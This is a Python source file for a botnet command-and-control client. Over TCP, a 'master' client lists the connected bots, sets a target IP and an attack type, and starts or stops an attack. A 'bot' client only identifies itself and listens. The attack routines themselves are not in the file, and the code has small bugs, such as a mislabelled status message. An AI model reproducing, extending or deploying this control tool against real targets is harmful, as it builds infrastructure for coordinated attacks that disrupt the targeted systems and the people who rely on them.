import threading
import socket
import argparse
import os
import sys
import time

RECV_BUFFER = 4096
ENCODING = 'utf-8'

botList = ""

logString = ''


def addToLog(s):
    global logString 
    logString = logString + str(s)

def writeLog():
    global logString
    print('Writing Log...')
    with open("log.txt","w") as f:
        f.write(logString)


class Send(threading.Thread):

    def __init__(self, sock: socket.socket) -> None:
        super().__init__()
        self.sock = sock
        self.attktype = ''
        self.targetip = ''

    def showcommands(self):
        print('\n'*2)
        print('='*10)
        print('Commands:\niam:{master or bot} ; Identifies client to server\nlistbot: ; Requests a list of connected bots\n\
changeip:{target_ip} ; Sets target IP\nchangeattk:{attack_type} ; Sets attack type\nstartattk: ; Executes chosen attack\n\
stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects from server') 
        print('='*10)


    def run(self):
        
        while True:
            self.showcommands()
            print('\nEnter Command: ')
            sys.stdout.flush()
            message = sys.stdin.readline()[:-1]

            if message.upper() == 'DISCONNECT:':
                self.disconnect()
                print('Quitting...')
                self.sock.close()
                os._exit(0)
            else:
                self.sock.sendall(message.encode(ENCODING))
                if message == '^C':
                    print('message is control')
                print(f'Sent {message} to server')            

    
    def changeip(self):
        self.sock.sendall(f'changeip:{self.targetip}'.encode(ENCODING))
        print(f'Client: sending changeip:{self.targetip}')


    def changeattk(self):
        self.sock.sendall(f'changeattk:{self.attktype}'.encode(ENCODING))
        print(f'Client: sending changeattk:{self.attktype}')


    def startattk(self):
        self.sock.sendall('startattk:'.encode(ENCODING))
        print('Client: sending iam')
    

    def stopattk(self):
        self.sock.sendall('stopattk:'.encode(ENCODING))
        print('Client: sending stopattk')


    def disconnect(self):
        time.sleep(1)
        self.sock.close()
        print('Disconnecting...')
        writeLog()
        os._exit(0)

    
    def listbot(self):
        self.sock.sendall('listbot:'.encode(ENCODING))
        print('Client: requesting bot list')

class Receive(threading.Thread):

    def __init__(self, sock: socket.socket, client_type: str, client) -> None:
        super().__init__()
        self.sock = sock
        self.client_type = client_type
        self.client = client
        self.botlist = ''

    def run(self) -> None:
        while True:
            try:
                recv_data = self.sock.recv(RECV_BUFFER)
            except ConnectionResetError:
                print("An existing connection was forcibly closed by the remote host")
                print('Quiting...')
                self.sock.close()
                os._exit(0)


            if recv_data:
                self._req_handler(recv_data)
            else:
                print('Disconnected from server')
                print('Quitting...')
                self.sock.close()
                writeLog()
                os._exit(0)

    def _req_handler(self, recv_data: bytes) -> None:
        recv_data_str = str(recv_data, ENCODING)
        try:
            request = recv_data_str.split(':')
            req_type = request[0]
            if req_type == 'whoami':
                print('Sending identification...')
                response = f'iam:{self.client_type}'.encode(ENCODING)
                self.sock.send(response)
            elif req_type == 'iam':
                if request[1] == 'success':
                    self.client.set_authenticated()
                else:
                    print('Cannot be authenticated.')
                    print('Quitting...')
                    writeLog()
                    self.sock.close()
                    os._exit(0)
            elif req_type == 'listbot':
                if len(request[1]):
                    self.botlist = request[1]
                    time.sleep(1)
                    global botList
                    botList = self.botlist

                    print(f'Bots:\n{self.botlist}')
                else:
                    print("No bots connected")

            else:
                print(
                    f'\rReceived command/response -> {recv_data_str}')
                # TODO: client custom client handler code here

        except ValueError as e:
            print('Could not parse request')
            # raise e


class Client:

    def __init__(self, host: str, port: int, type: str) -> None:
        self.host = host
        self.port = port
        self.type = type
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.authenticated = False
        self.receive = None
        self.botlist = ''

    def start(self) -> None:
        print(f'Connecting to {self.host}:{self.port}...')
        self.sock.connect((self.host, self.port))
        print(f'Successfully connected to {self.host}:{self.port}...')

        curr_time = str(int(time.time()))
        addToLog(f'[{curr_time}] : Connected to {self.host}:{self.port}')


        try:
            self.receive = Receive(self.sock, self.type, self)
            self.receive.start()
            if self.type == 'master':
                send = Send(self.sock)
                send.start()

        except KeyboardInterrupt:
            print("caught keyboard interrupt, exiting")
            self.sock.close()
            writeLog()
            os._exit(0)
        

        return


    def getBotList(self):
        print(f'Bots: {self.receive.botlist}')


    def set_authenticated(self) -> None:
        self.authenticated = True
        print('Successfully authorized')
        if self.type == 'master':
            send = Send(self.sock)
            send.start()

        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Client CLI')
    parser.add_argument('host', help='Interface the server listens at')
    parser.add_argument('-p', metavar='PORT', type=int,
                        default=8080, help='TCP port (default 8080)')
    parser.add_argument('-t', metavar='TYPE', type=str,
                        default='master', help='Client type (master or bot)')
    args = parser.parse_args()
    client = Client(args.host, args.p, args.t)
    client.start()
